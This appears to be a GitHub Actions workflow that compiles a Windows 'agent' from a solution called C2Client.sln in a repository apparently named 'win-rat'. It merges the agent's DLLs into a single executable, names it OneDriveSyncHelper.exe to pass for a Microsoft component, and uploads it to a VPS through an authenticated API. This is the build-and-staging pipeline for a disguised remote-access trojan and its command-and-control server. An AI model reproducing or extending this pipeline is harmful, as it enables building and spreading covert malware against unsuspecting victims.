name: Build Windows Agent

on:
  push:
    branches: [ "main", "master" ]
    paths:
      - 'agent/**'
      - '.github/workflows/build-agent.yml'
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup MSBuild
        uses: microsoft/setup-msbuild@v2

      - name: Download NuGet CLI
        shell: pwsh
        run: |
          if (-not (Test-Path "nuget.exe")) {
            Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile "nuget.exe"
          }
          Write-Host "nuget.exe ready"

      - name: Restore packages.config packages (Fody, AForge, etc.)
        shell: pwsh
        run: |
          .\nuget.exe install agent\packages.config -OutputDirectory packages -NonInteractive
          Write-Host "packages.config packages restored"

      - name: Restore PackageReference packages
        shell: pwsh
        working-directory: agent
        run: |
          ..\nuget.exe restore C2Client.sln -PackagesDirectory ..\packages -NonInteractive
          Write-Host "PackageReference packages restored"

      - name: Verify critical build dependencies
        shell: pwsh
        run: |
          $checks = @(
            "packages\Fody.6.8.2\build\Fody.targets",
            "packages\Costura.Fody.6.0.0\build\Costura.Fody.props",
            "packages\Costura.Fody.6.0.0\build\Costura.Fody.targets"
          )
          $allOk = $true
          foreach ($path in $checks) {
            if (Test-Path $path) {
              Write-Host "OK: $path"
            } else {
              Write-Host "MISSING: $path"
              $allOk = $false
            }
          }
          if (-not $allOk) {
            Write-Host "Installed packages:"
            Get-ChildItem packages | Select-Object Name | Format-Table -AutoSize
            exit 1
          }

      - name: Build Release
        shell: pwsh
        working-directory: agent
        run: |
          msbuild C2Client.sln `
            /p:Configuration=Release `
            /p:Platform="Any CPU" `
            /p:RestorePackages=false `
            /v:normal `
            /maxcpucount `
            /nologo
          if ($LASTEXITCODE -ne 0) {
            Write-Host "Build failed with exit code $LASTEXITCODE"
            exit $LASTEXITCODE
          }
          Write-Host "Build succeeded"

      - name: Merge DLLs with ILRepack
        shell: pwsh
        working-directory: agent
        run: |
          # Install ILRepack
          nuget install ILRepack -Version 2.0.34 -OutputDirectory packages

          $releaseDir = "bin\Release"
          $ilrepack = "packages\ILRepack.2.0.34\tools\ILRepack.exe"
          $mainExe = "$releaseDir\OneDriveSyncHelper.exe"
          $outputExe = "$releaseDir\OneDriveSyncHelper_merged.exe"

          if (-not (Test-Path $mainExe)) {
            Write-Host "Main exe not found!"
            exit 1
          }

          # Gather all DLLs in the release folder
          $dlls = Get-ChildItem "$releaseDir\*.dll" | ForEach-Object { $_.FullName }
          $dllCount = $dlls.Count
          Write-Host "Found $dllCount DLLs to merge"

          if ($dllCount -eq 0) {
            Write-Host "No DLLs found, skipping ILRepack"
          } else {
            # Run ILRepack
            & $ilrepack /out:$outputExe /target:exe /ndebug $mainExe @dlls
            if ($LASTEXITCODE -ne 0) {
              Write-Host "ILRepack failed, falling back to unmerged exe"
            } else {
              # Replace original with merged
              Remove-Item $mainExe -Force
              # Remove merged DLLs
              $dlls | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
              Rename-Item $outputExe "OneDriveSyncHelper.exe"
              Write-Host "ILRepack succeeded — single merged exe created"
            }
          }

      - name: List build output
        shell: pwsh
        run: |
          if (Test-Path "agent\bin\Release") {
            Get-ChildItem "agent\bin\Release" | Format-Table Name, Length -AutoSize
          } else {
            Write-Host "Release directory not found"
            exit 1
          }

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: agent-Release
          path: agent\bin\Release\OneDriveSyncHelper.exe
          retention-days: 30
          if-no-files-found: error

      - name: Deploy OneDriveSyncHelper.exe to VPS
        shell: pwsh
        env:
          VPS_URL: ${{ secrets.VPS_URL }}
          VPS_USERNAME: ${{ secrets.VPS_USERNAME }}
          VPS_PASSWORD: ${{ secrets.VPS_PASSWORD }}
        run: |
          $exePath = "agent\bin\Release\OneDriveSyncHelper.exe"

          if (-not (Test-Path $exePath)) {
            Write-Host "OneDriveSyncHelper.exe not found at $exePath, skipping deploy"
            exit 0
          }

          if ([string]::IsNullOrWhiteSpace($env:VPS_URL)) {
            Write-Host "WARNING: VPS_URL secret is not configured. Skipping deploy."
            Write-Host "Add these secrets on GitHub: VPS_URL, VPS_USERNAME, VPS_PASSWORD"
            Write-Host "Go to: https://github.com/Dontbyshai/win-rat/settings/secrets/actions"
            exit 0
          }

          Write-Host "Logging in to VPS API..."
          $loginBody = @{
            username = $env:VPS_USERNAME
            password = $env:VPS_PASSWORD
          } | ConvertTo-Json

          $loginResp = Invoke-RestMethod `
            -Uri "$env:VPS_URL/api/login" `
            -Method POST `
            -ContentType "application/json" `
            -Body $loginBody

          if ($loginResp.status -ne "success") {
            Write-Host "Login failed: $($loginResp.message)"
            exit 1
          }

          $token = $loginResp.data.token
          Write-Host "Login OK, uploading OneDriveSyncHelper.exe..."

          $form = @{
            exe = Get-Item $exePath
          }

          $uploadResp = Invoke-RestMethod `
            -Uri "$env:VPS_URL/api/exe" `
            -Method POST `
            -Headers @{ Authorization = "Bearer $token" } `
            -Form $form

          if ($uploadResp.status -ne "success") {
            Write-Host "Upload failed: $($uploadResp | ConvertTo-Json)"
            exit 1
          }

          Write-Host "OneDriveSyncHelper.exe deployed successfully to VPS!"
